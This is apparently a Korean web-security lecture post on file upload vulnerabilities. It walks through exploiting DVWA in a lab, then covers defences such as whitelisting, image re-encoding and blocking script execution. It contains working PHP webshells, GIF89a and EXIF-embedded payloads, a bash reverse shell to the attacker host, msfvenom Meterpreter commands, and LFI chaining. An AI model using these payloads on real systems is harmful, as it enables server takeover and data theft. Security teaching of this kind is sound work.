---
title: "[Web Security Lab] 10. File Upload Vulnerabilities"
date: 2026-06-01 19:00:00 +0900
categories:
  - 강의
  - 웹보안
  - 파일업로드
tags:
  - FileUpload
  - WebShell
  - DVWA
  - RCE
  - 웹모의해킹
pin: false
math: false
mermaid: true
---

## 실습 환경

| 항목 | 내용 |
|---|---|
| 공격 머신 | Kali Linux — `192.168.0.10` |
| 대상 서버 | Ubuntu + DVWA — `192.168.0.30/DVWA/` |
| 주요 도구 | Burp Suite, Netcat, msfvenom, exiftool |

---

## OWASP Top 10 매핑

| 항목 | 내용 |
|---|---|
| OWASP 카테고리 | **A02:2025 – Security Misconfiguration** · **A06:2025 – Insecure Design** (결과적으로 A05 Injection/RCE) |
| CWE | CWE-434 (위험한 유형의 파일 업로드 제한 실패) |
| 영향 | 웹쉘·Reverse Shell 업로드 → **서버 완전 장악(RCE)**, 가장 파급력 큰 취약점 군 |
| 한 줄 핵심 | 업로드 파일의 **유형·내용·실행 위치**를 통제하지 못해 악성 스크립트가 서버에서 실행됨 |

> "무제한 파일 업로드(CWE-434)"는 OWASP Top 10:2025에서도 **단독 항목은 아닙니다.**  
> 검증 누락은 **A06 Insecure Design(설계 결함)**, 업로드 디렉터리에서 스크립트 실행이 허용되는 설정은 **A02 Security Misconfiguration(보안 설정 오류)**,  
> 최종 결과는 **RCE(A05 Injection)** 입니다. 즉 "설계+설정+실행" 세 단계 모두에서 막아야 합니다.  
> (참고: 2025판에서 Security Misconfiguration은 A05→**A02**로, Insecure Design은 A04→**A06**으로 이동했습니다.)
{: .prompt-info }

---

## 공격의 역사와 주요 사건

### 유래와 발견

파일 업로드 취약점의 역사는 곧 **웹셸(WebShell)의 역사**입니다. 웹셸은 "웹으로 접근하는 원격 셸"로, 업로드 취약점의 최종 목적지입니다. 2000년대 중반 PHP 웹의 확산과 함께 **c99·r57**(러시아권에서 만들어진 다기능 PHP 셸)이 등장해, 파일 관리·DB 접속·포트 스캔까지 브라우저 하나로 가능하게 했습니다.

2012년경에는 **차이나 초퍼(China Chopper, 中国菜刀)** 라는 **4KB 안팎의 초소형 웹셸**이 나타났습니다. 본체가 워낙 작아(`<?php @eval($_POST['x']); ?>` 수준) 탐지가 어렵고, 전용 클라이언트로 강력하게 제어할 수 있어 **APT(지능형 지속 공격) 그룹의 단골 도구**가 되었습니다(2013년 Mandiant가 상세 분석 보고서를 공개).

### 주요 침해 사건

| 연도 | 사건 | 내용 |
|---|---|---|
| 2000년대 중반 | **c99 / r57 웹셸 확산** | 업로드·RFI 취약점을 통해 심어진 다기능 PHP 웹셸. 웹 변조·정보 탈취의 표준 도구 |
| 2012~ | **China Chopper** | 초소형 웹셸. 탐지 회피·지속성에 강해 국가배후 공격에 광범위 사용 |
| 2021 | **MS Exchange (ProxyLogon/ProxyShell)** | 초기 침투 후 **웹셸을 업로드해 지속성 확보** — 전 세계 수만 대 서버에 웹셸이 심어짐. "업로드/드롭된 웹셸"이 침해의 핵심 |

> 침해사고 대응(IR)에서 **웹 디렉터리의 의심스러운 스크립트 파일**(생성 시각이 이상하거나, `eval`/`system`/`base64_decode`가 보이는 파일)을 찾는 것이 웹셸 헌팅의 기본입니다. 업로드 취약점은 **"한 번 성공하면 영구 백도어"** 가 된다는 점에서 파급력이 가장 큽니다.
{: .prompt-warning }

### 왜 이 공격이 통하는가 — 근본 원리

파일 업로드가 RCE로 이어지려면 **세 가지 조건이 동시에** 성립해야 합니다. 거꾸로 말하면, 셋 중 하나만 끊어도 막힙니다.

1. **실행 가능한 파일을 올릴 수 있다**: 서버가 확장자·내용을 제대로 검사하지 않아 `.php` 같은 스크립트가 통과.
2. **올린 파일에 URL로 접근할 수 있다**: 업로드 경로가 웹 루트 안에 있어 브라우저로 직접 호출 가능.
3. **그 위치에서 스크립트가 실행된다**: 업로드 디렉터리에서 PHP 실행이 허용되어 있음.

검증을 우회하는 기법들은 모두 **"서버가 무엇을 믿는가"** 를 공격합니다.

- **확장자 블랙리스트**를 믿으면 → `.php5`·`.phtml`·`.phar` 같은 **대체 확장자**로 우회.
- **`Content-Type` 헤더**를 믿으면 → 그 값은 **클라이언트가 보내는 것**이라 Burp로 `image/jpeg`로 위조.
- **앞부분 시그니처(Magic Bytes)** 만 믿으면 → `GIF89a` 뒤에 PHP를 붙이거나 EXIF 주석에 코드를 심어 통과.

```
검증이 '클라이언트가 보낸 값'(확장자·Content-Type)을 믿으면 → 위조로 우회
검증이 '내용 일부'(앞 시그니처)만 믿으면 → 시그니처 위장으로 우회
→ 그래서 '화이트리스트 + 서버 측 내용 재처리(재인코딩) + 업로드 폴더 실행 차단'
```

근본 방어는 **허용 확장자 화이트리스트 + 서버에서 이미지 재인코딩(삽입 코드 제거) + 랜덤 파일명 + 업로드 디렉터리 스크립트 실행 금지 + 웹 루트 밖 저장**입니다. "설계(검증)·설정(실행 차단)·결과(RCE)" 세 단계 모두에서 막는 것이 핵심입니다.

---

## 1. File Upload 취약점 개요

**파일 업로드 취약점(File Upload Vulnerability)** 은 웹 애플리케이션이 제공하는 파일 업로드 기능을 악용하여, 악성 파일(WebShell 등)을 서버에 업로드한 뒤 직접 접근함으로써 서버에서 임의의 코드를 실행시키는 공격입니다.

공격에 성공하면 **RCE(Remote Code Execution)** 로 서버를 완전히 장악할 수 있으며, 이는 웹 취약점 중 파급력이 가장 큰 축에 속합니다.

### 1.1 공격 흐름

```mermaid
flowchart LR
    A[공격자] -->|악성 PHP 파일 업로드| B[웹 서버</br>파일 저장]
    B -->|업로드 경로 노출| C[공격자가 URL 직접 접근]
    C -->|GET ?cmd=id| D[서버에서 명령 실행]
    D -->|결과 반환| E[RCE 성공</br>서버 완전 장악]
```

### 1.2 WebShell 종류

| 종류 | 예시 | 특징 |
|---|---|---|
| **One-liner** | `<?php system($_GET['cmd']); ?>` | 가볍고 단순, 탐지 쉬움 |
| **고급 WebShell** | c99, r57, p0wny-shell | 파일 관리·포트 스캔 기능 포함 |
| **Reverse Shell** | `exec("/bin/bash -c 'bash -i >& /dev/tcp/...'")` | 서버가 공격자에게 연결, 방화벽 우회 |

> 업로드된 WebShell은 웹 서버 프로세스 권한(www-data 등)으로 실행됩니다. 권한 상승(Privilege Escalation) 취약점과 연계하면 root 탈취도 가능합니다.
{: .prompt-danger }

---

## 2. 검증 우회 기법

웹 애플리케이션은 악성 파일을 막기 위해 다양한 검증을 수행하지만, 각각의 우회 방법이 존재합니다.

### 2.1 우회 기법 비교표

| 검증 방식 | 서버의 검사 대상 | 우회 방법 |
|---|---|---|
| **확장자 블랙리스트** | 파일명 끝 확장자 | `.php5`, `.phtml`, `.phar`, `.php3` 대체 확장자 |
| **이중 확장자** | 마지막 확장자만 확인 | `shell.jpg.php`, `shell.php.jpg` |
| **대소문자 무시** | 소문자 변환 후 비교 | `shell.PHP`, `shell.PhP` |
| **Null Byte** | 문자열 끝 인식 오류 | `shell.php%00.jpg` |
| **Content-Type** | 요청 헤더의 MIME 타입 | Burp Suite로 `image/jpeg`로 변조 |
| **Magic Bytes** | 파일 앞 시그니처 바이트 | GIF/JPEG 시그니처 뒤에 PHP 코드 삽입 |

### 2.2 확장자 검증 우회

PHP 확장자를 블랙리스트 방식으로만 차단할 경우, 서버 설정에 따라 다음 확장자가 PHP로 해석될 수 있습니다.

```
.php5   .phtml   .phar   .php3   .php4
.shtml  .pht     .pgif
```

### 2.3 Content-Type 우회

브라우저가 파일을 전송할 때 헤더에 `Content-Type`을 포함합니다. 서버가 이 값만 검사한다면 Burp Suite로 변조하여 우회할 수 있습니다.

```http
# 원본 (PHP 업로드 시 브라우저가 전송하는 값)
Content-Type: application/x-php

# Burp Suite에서 변조
Content-Type: image/jpeg
```

> `Content-Type`은 클라이언트가 임의로 설정하는 값입니다. 서버가 이 값만 신뢰하면 검증을 전혀 안 한 것과 다름없습니다.
{: .prompt-warning }

### 2.4 Magic Bytes(파일 시그니처) 우회

파일 첫 몇 바이트를 검사하는 경우, 이미지 시그니처를 파일 앞에 추가하여 우회합니다.

| 포맷 | 시그니처 (Hex) | 문자열 |
|---|---|---|
| GIF | `47 49 46 38 39 61` | `GIF89a` |
| JPEG | `FF D8 FF` | — |
| PNG | `89 50 4E 47` | `‰PNG` |

```bash
# GIF 시그니처 + PHP 코드 조합
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

```mermaid
flowchart TD
    A[파일 업로드 요청] --> B{검증 방식}
    B --> C[확장자만 확인]
    B --> D[Content-Type만 확인]
    B --> E[Magic Bytes 확인]
    C -->|블랙리스트| F[대체 확장자로 우회</br>.php5 / .phtml]
    C -->|이중 확장자| G[shell.jpg.php 업로드]
    D --> H[Burp Suite로</br>image/jpeg 변조]
    E --> I[GIF89a + PHP 코드</br>시그니처 삽입]
    F --> J[WebShell 업로드 성공]
    G --> J
    H --> J
    I --> J
    J --> K[URL 직접 접근</br>RCE 실행]
```

---

## 3. DVWA 실습 — Security Level: Low

Low 레벨은 파일 확장자, Content-Type, 시그니처 검증이 **전혀 없습니다**. PHP 파일을 그대로 업로드할 수 있습니다.

### 3.0 레벨별 공격·방어 한눈에

| 레벨 | 서버 측 방어 | 공격(우회) 방안 | 방어 한계 |
|---|---|---|---|
| **Low** | 없음 | `shell.php` 그대로 업로드 → URL 직접 접근으로 RCE | 검증 자체가 없음 |
| **Medium** | `Content-Type`(MIME)만 검사 (예: `image/jpeg`) | Burp로 업로드 요청의 `Content-Type`을 `image/jpeg`로 위조 + 파일명은 `.php` | MIME은 클라이언트가 보내는 값이라 위조 가능 |
| **High** | 확장자 + **Magic Bytes(`getimagesize`)** 검사 | `GIF89a;` 시그니처를 앞에 붙이거나 exiftool로 이미지 메타데이터에 PHP 삽입 → `shell.php.jpg` + **LFI 연계** 실행 | 내용이 이미지처럼 보이면 통과 |
| **Impossible** | **확장자 화이트리스트 + 내용 재처리(이미지 재인코딩) + 랜덤 파일명 + Anti-CSRF 토큰** | 페이로드가 재인코딩 과정에서 제거되어 불가 | — (근본 방어) |

> 핵심: MIME(Medium)·시그니처(High)는 모두 위조·우회됩니다.  
> Impossible은 **화이트리스트 + 서버 측 이미지 재처리 + 업로드 폴더 스크립트 실행 차단**(8장)을 결합해 막습니다.
{: .prompt-tip }

### 3.1 WebShell 파일 생성

```bash
# Kali에서 one-liner WebShell 생성
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

### 3.2 DVWA에서 파일 업로드

1. 브라우저에서 `http://192.168.0.30/DVWA/` 접속 후 로그인합니다.
2. 좌측 메뉴 **File Upload** 를 클릭합니다.
3. **Choose File** → `shell.php` 선택 → **Upload** 를 클릭합니다.
4. 업로드 성공 시 다음 메시지와 함께 경로가 출력됩니다.

   ```
   ../../hackable/uploads/shell.php succesfully uploaded!
   ```

### 3.3 WebShell 실행 — 명령 실행

브라우저 주소창에 직접 URL을 입력하여 명령을 실행합니다.

```
# 현재 실행 사용자 확인
http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=id

# 시스템 사용자명 확인
http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=whoami

# /etc/passwd 파일 읽기
http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=cat+/etc/passwd

# 웹 루트 디렉토리 파일 목록 확인
http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=ls+-la+/var/www/html
```

> 명령 실행 결과가 브라우저에 그대로 출력되면 RCE 성공입니다.
{: .prompt-tip }

### 3.4 Reverse Shell로 업그레이드

One-liner WebShell을 발판 삼아 **Reverse Shell**을 획득하면 대화형 터미널을 얻을 수 있습니다.

**1단계: Kali에서 리스너 실행**

```bash
nc -lvnp 4444
```

**2단계: WebShell을 통해 Reverse Shell 실행 (URL 인코딩 필요)**

```
http://192.168.0.30/DVWA/hackable/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/192.168.0.10/4444+0>%261'
```

**3단계: Kali 터미널에서 연결 확인**

```
listening on [any] 4444 ...
connect to [192.168.0.10] from (UNKNOWN) [192.168.0.30] 49152
bash: no job control in this shell
www-data@ubuntu:/var/www/html/DVWA/hackable/uploads$
```

> Reverse Shell은 공격 대상 서버가 공격자에게 **먼저 연결**을 맺습니다. 서버 측 아웃바운드 방화벽이 열려 있으면 일반 방화벽을 우회할 수 있습니다.
{: .prompt-danger }

---

## 4. DVWA 실습 — Security Level: Medium

Medium 레벨은 서버가 `Content-Type` 헤더를 검사하여 `image/jpeg`, `image/png` 등 이미지 타입만 허용합니다. Burp Suite로 헤더를 변조하여 우회합니다.

### 4.1 Content-Type 우회 (Burp Suite)

**1단계: Burp Suite Intercept 활성화**

1. Burp Suite를 실행하고 **Proxy > Intercept > ON** 으로 설정합니다.
2. 브라우저 프록시를 `127.0.0.1:8080`으로 설정합니다.

**2단계: 파일 업로드 요청 가로채기**

1. DVWA File Upload 페이지에서 `shell.php` 선택 후 **Upload** 를 클릭합니다.
2. Burp Suite에 다음과 같은 요청이 캡처됩니다.

   ```http
   POST /DVWA/vulnerabilities/upload/ HTTP/1.1
   Host: 192.168.0.30
   Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

   ------WebKitFormBoundary...
   Content-Disposition: form-data; name="uploaded"; filename="shell.php"
   Content-Type: application/octet-stream

   <?php system($_GET["cmd"]); ?>
   ```

**3단계: Content-Type 변조**

Burp Suite에서 파일 파트의 `Content-Type` 값을 수정합니다.

```http
# 변경 전
Content-Type: application/octet-stream

# 변경 후
Content-Type: image/jpeg
```

**4단계: Forward → 업로드 성공 확인**

- **Forward** 버튼 클릭 후 브라우저에서 업로드 성공 메시지를 확인합니다.
- 이후 Low 레벨과 동일하게 URL 직접 접근으로 명령을 실행합니다.

> Content-Type은 클라이언트가 임의로 설정하는 값이므로 서버 측에서 실제 파일 내용을 검사해야 합니다.
{: .prompt-warning }

---

## 5. DVWA 실습 — Security Level: High

High 레벨은 파일의 실제 **Magic Bytes(파일 시그니처)** 를 검사하여 이미지 파일인지 확인합니다. Content-Type 변조만으로는 우회가 불가능하며, 실제 파일 내용에 이미지 시그니처를 삽입해야 합니다.

### 5.1 방법 1: GIF 시그니처 삽입

```bash
# GIF 시그니처(GIF89a)를 파일 앞에 추가하고 PHP 코드를 이어 붙임
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php.gif
```

- 파일 검사 시 GIF로 인식되어 업로드가 허용됩니다.
- 파일명이 `.php.gif`이므로 서버 설정에 따라 PHP로 실행될 수 있습니다.

### 5.2 방법 2: exiftool로 이미지 메타데이터에 PHP 코드 삽입

정상 JPEG 파일의 EXIF 주석 필드에 PHP 코드를 삽입하면 파일 시그니처 검사를 통과할 수 있습니다.

```bash
# 정상 JPEG 이미지에 PHP 코드를 주석(Comment)으로 삽입
exiftool -Comment='<?php system($_GET["cmd"]); ?>' legitimate.jpg -o shell.jpg.php
```

- `shell.jpg.php` 파일은 JPEG 시그니처를 가지므로 Magic Bytes 검사를 통과합니다.
- 확장자가 `.php`이면 Apache/Nginx가 PHP로 실행합니다.

### 5.3 LFI(파일 인클루전)와 연계

High 레벨에서 확장자 검사가 엄격하여 `.php` 확장자 업로드 자체가 차단될 경우, **LFI(Local File Inclusion)** 취약점과 연계하여 실행할 수 있습니다.

```
# 업로드된 shell.gif를 LFI 취약점으로 include하여 PHP 코드 실행
http://192.168.0.30/DVWA/vulnerabilities/fi/?page=../../hackable/uploads/shell.gif
```

> GIF 시그니처가 포함된 파일이더라도 PHP include/require로 로드되면 PHP 코드가 실행됩니다.
{: .prompt-danger }

---

## 5-1. Security Level: Impossible (방어 성공)

Impossible 레벨은 여러 방어를 **동시에** 적용합니다.

1. **확장자 화이트리스트** — `jpg`,`jpeg`,`png` 만 허용합니다(대소문자 정규화 포함).
2. **내용 검증 + 재처리** — `getimagesize()`로 실제 이미지인지 확인하고, **`imagecreatefromjpeg()` → 재인코딩**으로 메타데이터(삽입된 PHP)를 제거합니다.
3. **랜덤 파일명** — 업로드 파일명을 서버가 난수로 바꿔 원본 확장자/경로 추측을 차단합니다.
4. **Anti-CSRF 토큰** — 자동화 업로드 위조를 차단합니다.

```php
// Impossible 핵심: 이미지를 재인코딩해 삽입 코드 제거
$uploaded = imagecreatefromjpeg($tmp);   // 이미지가 아니면 실패
imagejpeg($uploaded, $target, 100);      // 재인코딩 → EXIF/주석 내 PHP 소멸
```

exiftool로 EXIF에 PHP를 심어도 **재인코딩 과정에서 주석이 사라지므로** 실행 코드가 남지 않습니다.  
여기에 **업로드 디렉터리에서 PHP 실행 자체를 차단**(8.2 `.htaccess`)하면 LFI 연계까지 막힙니다.

---

## 6. 고급 실습 — msfvenom PHP Meterpreter

단순 WebShell 대신 **Metasploit Meterpreter** 페이로드를 사용하면 파일 시스템 탐색, 권한 상승, 피벗팅 등 고급 기능을 활용할 수 있습니다.

### 6.1 PHP Meterpreter 페이로드 생성

```bash
# PHP Meterpreter Reverse TCP 페이로드 생성
msfvenom -p php/meterpreter/reverse_tcp \
         LHOST=192.168.0.10 \
         LPORT=4444 \
         -f raw > meterpreter.php
```

### 6.2 Metasploit 리스너 실행

```bash
# Metasploit 콘솔에서 핸들러 실행
msfconsole -x "use exploit/multi/handler; \
               set payload php/meterpreter/reverse_tcp; \
               set LHOST 192.168.0.10; \
               set LPORT 4444; \
               run"
```

### 6.3 페이로드 업로드 및 실행

1. `meterpreter.php` 파일을 DVWA File Upload에 업로드합니다.
2. 브라우저로 업로드된 URL에 접근합니다: `http://192.168.0.30/DVWA/hackable/uploads/meterpreter.php`
3. Metasploit 콘솔에서 Meterpreter 세션을 확인합니다.

```
[*] Sending stage (39927 bytes) to 192.168.0.30
[*] Meterpreter session 1 opened (192.168.0.10:4444 -> 192.168.0.30:49200)

meterpreter > sysinfo
Computer    : ubuntu
OS          : Linux ubuntu 5.15.0 #1 SMP (Linux)
meterpreter > getuid
Server username: www-data
```

### 6.4 주요 Meterpreter 명령

| 명령 | 설명 |
|---|---|
| `sysinfo` | 시스템 정보 확인 |
| `getuid` | 현재 사용자 확인 |
| `ls`, `cd`, `pwd` | 파일 시스템 탐색 |
| `download <파일>` | 파일 다운로드 |
| `upload <파일>` | 파일 업로드 |
| `shell` | 대화형 쉘 획득 |
| `run post/multi/recon/local_exploit_suggester` | 권한 상승 취약점 탐색 |

---

## 7. 전체 공격 흐름 요약

```mermaid
flowchart TD
    A[파일 업로드 기능 발견] --> B{검증 수준 파악}
    B --> C[Low</br>검증 없음]
    B --> D[Medium</br>Content-Type 검사]
    B --> E[High</br>Magic Bytes 검사]
    C -->|PHP 직접 업로드| F[shell.php 업로드]
    D -->|Burp Suite 변조| G[Content-Type: image/jpeg]
    G --> F
    E -->|시그니처 삽입| H[GIF89a + PHP 코드</br>또는 exiftool EXIF 삽입]
    H --> F
    F --> I[업로드 경로 확인]
    I --> J[URL 직접 접근</br>?cmd=id 실행]
    J --> K{목적}
    K --> L[정보 수집</br>id / passwd / ls]
    K --> M[Reverse Shell</br>nc -lvnp 4444]
    K --> N[Meterpreter</br>고급 후속 공격]
    M --> O[대화형 쉘 획득]
    N --> P[권한 상승 / 피벗팅]
```

---

## 8. 방어 방법

### 8.1 핵심 방어 기법

| 방어 기법 | 설명 |
|---|---|
| **화이트리스트 확장자 검증** | `.jpg`, `.png`, `.gif` 등 허용 목록만 수락 |
| **서버 측 Content-Type 재검증** | 클라이언트 헤더 불신, 실제 파일 내용으로 재확인 |
| **Magic Bytes 검사** | PHP GD 라이브러리 등으로 실제 이미지 여부 확인 |
| **파일명 재생성** | UUID + 허용 확장자만 보존 (원본 파일명 폐기) |
| **업로드 디렉토리 PHP 실행 금지** | `.htaccess` 또는 Apache/Nginx 설정으로 스크립트 실행 차단 |
| **웹 루트 외부 저장** | `/var/www/html` 밖에 저장 후 다운로드 전용 스크립트로 제공 |
| **CDN/오브젝트 스토리지 분리** | S3, GCS 등에 저장하여 실행 환경과 완전히 분리 |

### 8.2 업로드 디렉토리 PHP 실행 금지 (.htaccess)

```apache
# 업로드 디렉토리 PHP 실행 금지
<Directory /var/www/html/uploads>
    php_flag engine off
    AddType text/plain .php .php5 .phtml .phar
</Directory>
```

### 8.3 서버 측 이미지 재처리 (PHP 예시)

파일을 업로드받은 뒤 GD 라이브러리로 **재렌더링**하면 파일 안에 삽입된 PHP 코드가 제거됩니다.

```php
<?php
// 업로드된 이미지를 GD로 재처리하여 임베드된 코드 제거
$source = $_FILES['uploaded']['tmp_name'];
$image = imagecreatefromjpeg($source);
$output_path = '/var/uploads/' . uniqid() . '.jpg';
imagejpeg($image, $output_path, 85);
imagedestroy($image);
?>
```

> 재처리는 EXIF 데이터(메타데이터에 삽입된 PHP 코드 포함)를 제거하는 효과도 있습니다.
{: .prompt-tip }

### 8.4 Nginx 업로드 디렉토리 설정

```nginx
# Nginx: uploads 디렉토리에서 PHP 실행 차단
location /uploads {
    location ~ \.php$ {
        deny all;
    }
}
```

---

## 9. 핵심 정리

1. **파일 업로드 취약점**은 악성 파일을 서버에 업로드하고 직접 접근하여 RCE를 유발하는 공격입니다.
2. **Low**: 검증이 없어 PHP 파일을 그대로 업로드하고 URL로 바로 실행 가능합니다.
3. **Medium**: Content-Type 헤더만 검사하므로 Burp Suite로 `image/jpeg`로 변조하여 우회합니다.
4. **High**: Magic Bytes를 검사하므로 `GIF89a` 시그니처를 삽입하거나 exiftool로 EXIF에 PHP 코드를 넣어 우회합니다.
5. WebShell 획득 후 **Reverse Shell** 또는 **Meterpreter**로 업그레이드하면 대화형 접근이 가능합니다.
6. 방어의 핵심은 **화이트리스트 확장자 + 파일명 재생성 + 업로드 디렉토리 실행 금지 + 웹 루트 외부 저장**의 조합입니다.

---

## 10. 정보보안기사 시험 포인트

| 구분 | 꼭 외울 것 |
|---|---|
| **취약점 판단** | 게시판에 **글쓰기 권한·파일 첨부 권한**이 있는지, **`jsp`·`php`·`asp` 등 스크립트 확장자 업로드**가 가능한지 점검 |
| **발생 조건** | ① 실행 가능 파일 업로드 ② URL로 접근 가능 ③ 저장 위치에서 스크립트 실행 |
| **웹셸** | `<% eval request("cmd") %>`·`<?php system($_GET['cmd']); ?>` 형태. `eval`(평가)·`execute`(실행)로 외부 코드 실행 |
| **방어** | 확장자 **화이트리스트** + 서버 측 내용 재처리 + 업로드 폴더 **스크립트 실행 차단** + 웹 루트 밖 저장 |

> **★ 함정**: 파일 업로드 취약점 판단 항목으로 "게시판에 **스크립트 태그 입력**이 가능한지"를 넣으면 **틀립니다** — 그건 **XSS** 점검 항목입니다. 상세 이론은 **11번 포스트 8.1~8.2장** 참고.
{: .prompt-tip }
